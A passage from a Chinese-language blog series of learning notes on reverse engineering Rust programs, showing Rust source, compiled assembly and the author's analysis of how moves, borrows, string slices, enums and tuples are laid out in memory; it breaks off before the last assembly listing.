<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mov     byte ptr [rsp + 231], 0</span><br><span class="line">mov     rax, qword ptr [rsp + 56]</span><br><span class="line">mov     qword ptr [rsp + 144], rax</span><br><span class="line">movups  xmm0, xmmword ptr [rsp + 40]</span><br><span class="line">movaps  xmmword ptr [rsp + 128], xmm0</span><br><span class="line">lea     rax, [rsp + 128]</span><br><span class="line">mov     qword ptr [rsp + 248], rax</span><br><span class="line">lea     rax, [rip + &lt;alloc::string::String as core::fmt::Display&gt;::fmt]</span><br><span class="line">mov     qword ptr [rsp + 256], rax</span><br><span class="line">mov     rax, qword ptr [rsp + 248]</span><br><span class="line">mov     qword ptr [rsp], rax</span><br></pre></td></tr></table></figure>
<p>上面的代码将<code>String</code>实例占用的0x18大小内存空间（len、ptr、capacity）拷贝到了<code>[rsp+128]</code>的地方，一次使用<code>rax</code>拷贝，一次使用<code>xmm0</code>拷贝。随后，<code>[rsp+128]</code>这个指针被拷贝到<code>[rsp+248]</code>和<code>[rsp]</code>中，推测变量<code>y</code>就保存在<code>[rsp]</code>。</p>
<p>可以看到，<code>String</code>实例的移动会在栈上再创建一个<code>String</code>实例空间，但实际指向的字符串指针相同。不过有意思的是，Rust在后续并没有对变量<code>x</code>的内存空间进行任何处理。在<code>y</code>使用完之前，<code>x</code>不能将自身的实例删除，这样相当于也删除了<code>y</code>。但后续代码将不再使用变量<code>x</code>，即如果变量<code>y</code>在后续进行了更新，字符串地址发生了改变，变量<code>x</code>中保存的字符串地址也无法同步更新。不过Rust并没有将变量<code>x</code>的所有内容清空，而是继续保留在原来的位置。也就会说，变量<code>x</code>在移动操作完成之后，其保存的内容将永远是移动操作完成前一刻的内容，且此后正常情况下不再改变。不过没有清空就意味着有数据泄露的可能性。倘若Rust代码中有Unsafe部分代码被攻击者利用，这部分数据可就危险了。</p>
<p>下面的代码示例证明了变量移动后并没有被删除。两次输出的结果相同，均为llo，你可能会想：为什么已经被Rust废弃的变量依然能够具有引用。因为Rust中的废弃和生命周期走向结束并不相同，废弃仅仅代表后续代码无法对其进行访问，无法获取其所有权，但对于引用类型，还是可以使用的，但无法获取其所有权。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span>: <span class="type">String</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = &amp;x[<span class="number">2</span>..];</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;y = &#123;&#125;&quot;</span>, y);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;CoLin&quot;</span>);</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;y = &#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="reverse-for-references-and-borrows"><a class="markdownIt-Anchor" href="#reverse-for-references-and-borrows"></a> Reverse for References and Borrows</h1>
<p>引用和借用是Rust的重要特性，它允许一个变量在不获取所有权、不转移所有权的前提下使用某个变量。借用指的是通过引用传递参数给函数的方法。既然涉及函数传参，那么下面我们就来通过一个函数调用的示例对Rust的引用与借用进行源码和汇编层面的分析。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">print_len</span>(s: &amp;<span class="type">String</span>) &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;the length of the string &#123;&#125; is: &#123;&#125;&quot;</span>, s, s.<span class="title function_ invoke__">len</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_len</span>(&amp;x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面是<code>main</code>函数的部分反编译结果：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sub     rsp, 56</span><br><span class="line">lea     rsi, [rip + .L__unnamed_6]</span><br><span class="line">lea     rdi, [rsp + 16]</span><br><span class="line">mov     qword ptr [rsp + 8], rdi</span><br><span class="line">mov     edx, 5</span><br><span class="line">call    &lt;alloc::string::String as core::convert::From&lt;&amp;str&gt;&gt;::from</span><br><span class="line">mov     rdi, qword ptr [rsp + 8]</span><br><span class="line">call    example::print_len</span><br></pre></td></tr></table></figure>
<p>可以看到，<code>main</code>函数直接将<code>x</code>的内存地址，即保存<code>String</code>实例地址的地址传递给<code>print_len</code>函数。这样子函数只需要通过获取该地址即可完成后续操作。</p>
<p>但是转念一想，如果子函数的参数不是引用，只是单纯的<code>String</code>，汇编代码层又会有什么不同呢？这样的例子总是存在的，当一个结构体非常庞大时，如果只通过寄存器与栈传递参数，未免有点太不优雅了。下面是将参数修改为<code>String</code>后<code>main</code>函数的部分反编译结果：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sub     rsp, <span class="number">56</span></span><br><span class="line">lea     rdi, [rsp + <span class="number">8</span>]</span><br><span class="line">lea     rsi, [rip + .L__unnamed_6]</span><br><span class="line">mov     edx, <span class="number">5</span></span><br><span class="line">call    &lt;alloc::string::<span class="type">String</span> <span class="keyword">as</span> core::convert::<span class="built_in">From</span>&lt;&amp;<span class="type">str</span>&gt;&gt;::from</span><br><span class="line">mov     rax, qword ptr [rsp + <span class="number">8</span>]</span><br><span class="line">mov     qword ptr [rsp + <span class="number">32</span>], rax</span><br><span class="line">mov     rax, qword ptr [rsp + <span class="number">16</span>]</span><br><span class="line">mov     qword ptr [rsp + <span class="number">40</span>], rax</span><br><span class="line">mov     rax, qword ptr [rsp + <span class="number">24</span>]</span><br><span class="line">mov     qword ptr [rsp + <span class="number">48</span>], rax</span><br><span class="line">lea     rdi, [rsp + <span class="number">32</span>]</span><br><span class="line">call    example::print_len</span><br></pre></td></tr></table></figure>
<p>可以看到，这里实际上传递到<code>print_len</code>函数的参数依然只有1个，但不同的是，<code>main</code>函数首先将<code>String</code>实例在栈上复制了一份，然后将复制那份的地址传了过去。另外，对于实例的删除位置不同，这是由Rust语言特性所决定的，不加引用意味着变量的所有权被转移到了子函数中，删除操作将在子函数中进行；加引用则所有权不转移，删除操作将在父函数中进行。不加引用的父函数操作与移动非常相似，只不过是没有将复制出来的实例地址放到栈的某处。想来其实也很合理，不加引用实际上就是完成了所有权的移动嘛。</p>
<h1 id="reverse-for-string-slices"><a class="markdownIt-Anchor" href="#reverse-for-string-slices"></a> Reverse for String Slices</h1>
<p>在Rust中，存在与Python类似的切片类型Slice，对于字符串而言，字符串字面量也可以看做是一个字符串切片。</p>
<p>考虑下面的Rust代码：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="type">String</span>::<span class="title function_ invoke__">from</span>(<span class="string">&quot;I&#x27;m CoLin&quot;</span>);</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">y</span> = &amp;x[<span class="number">4</span>..];</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;&#125;&quot;</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>其部分反编译结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">sub     rsp, 184</span><br><span class="line">lea     rsi, [rip + .L__unnamed_5]</span><br><span class="line">lea     rdi, [rsp + 40]</span><br><span class="line">mov     qword ptr [rsp + 16], rdi</span><br><span class="line">mov     edx, 9</span><br><span class="line">call    &lt;alloc::string::String as core::convert::From&lt;&amp;str&gt;&gt;::from</span><br><span class="line">mov     rdi, qword ptr [rsp + 16]</span><br><span class="line">mov     qword ptr [rsp + 80], 4</span><br><span class="line">mov     rsi, qword ptr [rsp + 80]</span><br><span class="line">lea     rdx, [rip + .L__unnamed_6]</span><br><span class="line">call    &lt;alloc::string::String as core::ops::index::Index&lt;core::ops::range::RangeFrom&lt;usize&gt;&gt;&gt;::index</span><br><span class="line">mov     qword ptr [rsp + 24], rdx</span><br><span class="line">mov     qword ptr [rsp + 32], rax</span><br></pre></td></tr></table></figure>
<p>可以看到，<code>String</code>实例指针，即变量<code>x</code>被保存在<code>[rsp+16]</code>的位置，随后程序调用了一个<code>core::ops::index::Index&lt;core::ops::range::RangeFrom&lt;usize&gt;&gt;&gt;::index</code>方法，实际上也就是从字符串中获取切片的方法。该方法的参数按顺序依次为：<code>String</code>实例指针、切片的起始索引值、另外一个字符串切片，这第三个参数指向的是保存工程名的字符串，可以忽略。如果将Rust源码的<code>[4..]</code>改为<code>[4..7]</code>，会发现第三个参数变成了7，函数名变成了<code>Range</code>，如果是<code>[..4]</code>，则函数名为<code>RangeTo</code>，传参与<code>[4..]</code>完全相同。由此可见字符串取切片实际上有3个方法控制。返回值由两个寄存器传递，<code>rdx</code>保存的是长度，<code>rax</code>保存的是字符串指针。</p>
<h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1>
<p>本文按照Rust权威指南的讲解顺序，向后学习了：</p>
<ol>
<li>变量隐藏在汇编层中的表现，隐藏后变量值不变</li>
<li>数组变量在汇编层的数据结构，与C类似</li>
<li>变量移动在汇编层与变量移动类似</li>
<li>字符串切片相关操作在汇编层的实现</li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/10/20/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="CoLin">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="CoLin's BLOG">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/20/Rust%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0-2/" class="post-title-link" itemprop="url">Rust逆向学习 (2)</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-10-20 10:18:28" itemprop="dateCreated datePublished" datetime="2023-10-20T10:18:28+08:00">2023-10-20</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-10-22 16:57:52" itemprop="dateModified" datetime="2023-10-22T16:57:52+08:00">2023-10-22</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
                </span>
                  , 
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/Rust%E9%80%86%E5%90%91%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">Rust逆向系列</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">Symbols count in article: </span>
              <span>6.6k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">Reading time &asymp;</span>
              <span>6 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>在上一篇文章中，我们比较完美地完成了第一次Rust ELF的逆向工作，但第一次编写的Rust程序毕竟只使用了非常有限的几种Rust特性，Rust还有很多的东西没有涉及，像是流程控制、泛型、Trait等。这些内容我们将在本文以及以后的文章中一一进行学习与探索。</p>
<h1 id="guess-a-number"><a class="markdownIt-Anchor" href="#guess-a-number"></a> Guess a number</h1>
<h2 id="0x01-guess-a-number-part-1"><a class="markdownIt-Anchor" href="#0x01-guess-a-number-part-1"></a> 0x01. Guess a number .part 1</h2>
<p>本文从一个跳跃不是很大的程序开始，也就是一个真正的猜数字小程序：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> std::cmp::Ordering;</span><br><span class="line"><span class="keyword">use</span> std::io;    <span class="comment">// prelude</span></span><br><span class="line"><span class="keyword">use</span> rand::Rng;  <span class="comment">// trait</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">secret</span> = rand::<span class="title function_ invoke__">thread_rng</span>().<span class="title function_ invoke__">gen_range</span>(<span class="number">1</span>, <span class="number">101</span>);    <span class="comment">// ThreadRng: random number generator</span></span><br><span class="line">    <span class="keyword">loop</span> &#123;</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Please guess a number between 1 and 100:&quot;</span>);</span><br><span class="line">        <span class="keyword">let</span> <span class="keyword">mut </span><span class="variable">guess</span> = <span class="type">String</span>::<span class="title function_ invoke__">new</span>();</span><br><span class="line">        io::<span class="title function_ invoke__">stdin</span>().<span class="title function_ invoke__">read_line</span>(&amp;<span class="keyword">mut</span> guess)</span><br><span class="line">            .<span class="title function_ invoke__">expect</span>(<span class="string">&quot;Cannot read a line!&quot;</span>);</span><br><span class="line">        <span class="built_in">println!</span>(<span class="string">&quot;Your guess is: &#123;&#125;&quot;</span>, guess);</span><br><span class="line">        <span class="keyword">let</span> <span class="variable">guess</span>: <span class="type">u32</span> = <span class="keyword">match</span> guess.<span class="title function_ invoke__">trim</span>().<span class="title function_ invoke__">parse</span>() &#123;</span><br><span class="line">            <span class="title function_ invoke__">Ok</span>(num) =&gt; num,</span><br><span class="line">            <span class="title function_ invoke__">Err</span>(_) =&gt; <span class="keyword">continue</span>,</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="keyword">match</span> guess.<span class="title function_ invoke__">cmp</span>(&amp;secret)&#123;</span><br><span class="line">            Ordering::Less =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Too small.&quot;</span>),</span><br><span class="line">            Ordering::Greater =&gt; <span class="built_in">println!</span>(<span class="string">&quot;Too large.&quot;</span>),</span><br><span class="line">            Ordering::Equal =&gt; &#123; </span><br><span class="line">                <span class="built_in">println!</span>(<span class="string">&quot;You win.&quot;</span>); </span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里要注意，使用上一篇文章中的<a target="_blank" rel="noopener" href="https://godbolt.org/">编译工具网站</a>时需要添加库并在代码中通过<code>extern crate rand</code>手动加载rand库，否则会编译失败。</p>
<p>考虑到效率问题，本文对于上述代码的反汇编以IDA的反汇编结果为主，汇编代码分析为辅。</p>
<p><img src="1.png" alt="" /></p>
<h3 id="line-1"><a class="markdownIt-Anchor" href="#line-1"></a> line 1</h3>
<p>第一行中<code>thread_rng</code>方法返回<code>ThreadRng</code>实例，也就是使用于单个线程的随机数产生器实例，随后将其作为参数1（即self），参数2和参数3分别为范围的下界和上界。通过汇编代码可以发现，<code>Range</code>这个对象需要两个寄存器传递。通过查看Rust官方库源码也可以发现，<code>Range</code>实际上也就只有开始和结尾这两个属性值：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">Range</span>&lt;Idx&gt; &#123;</span><br><span class="line">    <span class="comment">/// The lower bound of the range (inclusive).</span></span><br><span class="line">    <span class="meta">#[stable(feature = <span class="string">&quot;rust1&quot;</span>, since = <span class="string">&quot;1.0.0&quot;</span>)]</span></span><br><span class="line">    <span class="keyword">pub</span> start: Idx,</span><br><span class="line">    <span class="comment">/// The upper bound of the range (exclusive).</span></span><br><span class="line">    <span class="meta">#[stable(feature = <span class="string">&quot;rust1&quot;</span>, since = <span class="string">&quot;1.0.0&quot;</span>)]</span></span><br><span class="line">    <span class="keyword">pub</span> end: Idx,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>gen_range</code>方法以常规的方式使用<code>rax</code>返回了生成的随机数值。</p>
<p>随后，一个<code>drop_in_place</code>直接删除了<code>ThreadRng</code>实例，可见Rust对于生命周期的管理非常严格，后续代码已经没有使用<code>ThreadRng</code>实例的代码，因此Rust直接就将其删除了，尽最大可能减少对象重用与悬垂指针引用的可能。</p>
<h3 id="loop"><a class="markdownIt-Anchor" href="#loop"></a> loop</h3>
<p>在Rust的反汇编界面中，<code>continue</code>很少见到，因为对于一个循环而言，其内部很有可能存在生命周期在循环之内的对象，因此即使Rust代码中写<code>continue</code>，Rust也需要首先将循环中创建的对象删除之后再开始新一轮循环。这也就导致IDA的反汇编界面中可能会出现很多<code>goto</code>。</p>
<h3 id="line-3~7"><a class="markdownIt-Anchor" href="#line-3~7"></a> line 3~7</h3>
<p><code>println!</code>的特征很好识别，<code>Arguments::new_v1</code>和<code>_print</code>一出，就知道肯定又是一次输出，不过输出的具体字符串内容直接查看反汇编界面无法确定，不过在汇编代码中也很好找。随后的<code>String::new</code>等也非常正常。</p>
<h3 id="match"><a class="markdownIt-Anchor" href="#match"></a> match</h3>
<p>上述代码一共有两个<code>match</code>语句，第一个是将字符串<code>parse</code>的结果进行判断，替换了上一篇文章中的<code>expect</code>。这里<code>parse</code>函数的返回值是一个枚举对象<code>Result&lt;F, F::Err&gt;</code>。我们知道Rust的枚举对象是一个很强大的结构，比C/C++中的枚举对象好用很多，这是因为Rust的枚举对象可以理解成一个Key有限且确定的Map，选择一个Key之后还能够根据Key指定的数据类型自由设置Value。在这里我们不妨研究一下，Rust中的枚举对象是如何组织的。</p>
<h2 id="0x02-reverse-for-enum"><a class="markdownIt-Anchor" href="#0x02-reverse-for-enum"></a> 0x02. Reverse for enum</h2>
<p>下面通过一个简单的程序对枚举类型进行逆向分析。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#[derive(Debug)]</span></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">enum</span> <span class="title class_">Student</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Freshman</span>(<span class="type">String</span>),</span><br><span class="line">    <span class="title function_ invoke__">Sophomore</span>(<span class="type">String</span>),</span><br><span class="line">    <span class="title function_ invoke__">Junior</span>(<span class="type">String</span>),</span><br><span class="line">    <span class="title function_ invoke__">Senior</span>(<span class="type">String</span>),</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">get_student</span>(grade: <span class="type">i32</span>, name: <span class="type">String</span>) <span class="punctuation">-&gt;</span> <span class="type">Option</span>&lt;Student&gt; &#123;</span><br><span class="line">    <span class="keyword">match</span> grade &#123;</span><br><span class="line">        <span class="number">1</span> =&gt; <span class="title function_ invoke__">Some</span>(Student::<span class="title function_ invoke__">Freshman</span>(name)),</span><br><span class="line">        <span class="number">2</span> =&gt; <span class="title function_ invoke__">Some</span>(Student::<span class="title function_ invoke__">Sophomore</span>(name)),</span><br><span class="line">        <span class="number">3</span> =&gt; <span class="title function_ invoke__">Some</span>(Student::<span class="title function_ invoke__">Junior</span>(name)),</span><br><span class="line">        <span class="number">4</span> =&gt; <span class="title function_ invoke__">Some</span>(Student::<span class="title function_ invoke__">Senior</span>(name)),</span><br><span class="line">        _ =&gt; <span class="literal">None</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = <span class="title function_ invoke__">get_student</span>(<span class="number">4</span>, <span class="string">&quot;CoLin&quot;</span>.<span class="title function_ invoke__">to_string</span>()).<span class="title function_ invoke__">unwrap</span>();</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;&#123;:?&#125;&quot;</span>, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上述代码定义了一个枚举类型。首先来看<code>get_student</code>方法：</p>
<p><img src="2.png" alt="" /></p>
<p>可以看到，在反汇编界面中，IDA将<code>match</code>语句识别为<code>switch</code>语句，通过汇编代码的分析也能够很容易地发现<strong>跳表</strong>的存在。</p>
<p><img src="3.png" alt="" /></p>
<p>通过查看main函数的方法调用，可以获得<code>get_student</code>方法的参数分别为：<code>Student</code>对象指针、<code>grade</code>参数、<code>name</code>参数。在<code>switch</code>语句中，我们发现每一个分支都有大量的值传送指令，含义未知，但我们可以通过函数调用前后获取到枚举类型的大小与内容。</p>
<p><img src="4.png" alt="" /></p>
<p>经过分析，获取到了枚举对象的内容如上图所示。从函数内容等处可以推断出，枚举对象的第一个值3表示的是枚举对象<code>grade</code>的关键字索引，这里由于返回的是<code>Student::Senior</code>，索引为3，也即枚举对象中的4个索引值对应了0、1、2、3这4个索引值。后面还有3个值，其中有字符串指针和字符串长度，经过测试发现，<code>String</code>对象占0x18大小内存，偏移0x8为字符串指针，偏移0和0x10均为字符串长度。</p>
<p>之后，笔者修改了<code>Student</code>枚举类型的定义，在每一项后面加上了一个<code>i32</code>，经过调试发现枚举类型的属性偏移如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x0         枚举索引</span><br><span class="line">0x4         i32</span><br><span class="line">0x8~0x20    String</span><br></pre></td></tr></table></figure>
<p>位于后面的<code>i32</code>类型反而在内存中更加靠前了。笔者推测这可能与Rust对<code>tuple</code>的内存排布有关，考虑到枚举索引很少有超过1个字节（不然就意味着有超过255个分支），使用后面4个字节能节省一定的内存空间。不过无论<code>tuple</code>是如何排布的，Rust的枚举类型在内存中的布局现在已经很清楚了，就是<font color=red><strong>索引值+内容</strong></font>。</p>
<p>不过既然都已经看到了<code>tuple</code>的不寻常，接下来不妨也对其进行一番研究。</p>
<h2 id="0x03-reverse-for-tuple"><a class="markdownIt-Anchor" href="#0x03-reverse-for-tuple"></a> 0x03. Reverse for Tuple</h2>
<p>下面将尝试通过数个Tuple的反编译结果分析Tuple的内存布局。众所周知，Tuple就是若干个数据的集合，这些数据之间没有什么明确的关联，只有一个Tuple将它们约束在一个集合中。</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = (<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="type">String</span>::<span class="title function_ invoke__">new</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于上述代码逆向的结果如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">example::main:</span><br><span class="line">        sub     rsp, 72</span><br><span class="line">        lea     rdi, [rsp + 48]</span><br><span class="line">        call    alloc::string::String::new</span><br><span class="line">        mov     dword ptr [rsp], 2</span><br><span class="line">        mov     dword ptr [rsp + 4], 3</span><br><span class="line">        mov     dword ptr [rsp + 8], 5</span><br><span class="line">        mov     dword ptr [rsp + 12], 7</span><br><span class="line">        mov     dword ptr [rsp + 16], 11</span><br><span class="line">        mov     rax, qword ptr [rsp + 48]</span><br><span class="line">        mov     qword ptr [rsp + 24], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 56]</span><br><span class="line">        mov     qword ptr [rsp + 32], rax</span><br><span class="line">        mov     rax, qword ptr [rsp + 64]</span><br><span class="line">        mov     qword ptr [rsp + 40], rax</span><br><span class="line">        mov     rdi, rsp</span><br><span class="line">        call    qword ptr [rip + core::ptr::drop_in_place&lt;(i32,i32,i32,i32,i32,alloc::string::String)&gt;@GOTPCREL]</span><br><span class="line">        add     rsp, 72</span><br><span class="line">        ret</span><br></pre></td></tr></table></figure>
<p>从相对于<code>rsp</code>的偏移量可以看出Tuple的排布情况，上述Tuple的内存排布顺序与数据的定义顺序相同。</p>
<p>但对于下面一个Tuple而言就不同了：</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">fn</span> <span class="title function_">main</span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">x</span> = (<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">11</span>, <span class="type">String</span>::<span class="title function_ invoke__">new</span>(), <span class="string">&quot;CoLin&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>逆向的结果为：</p>
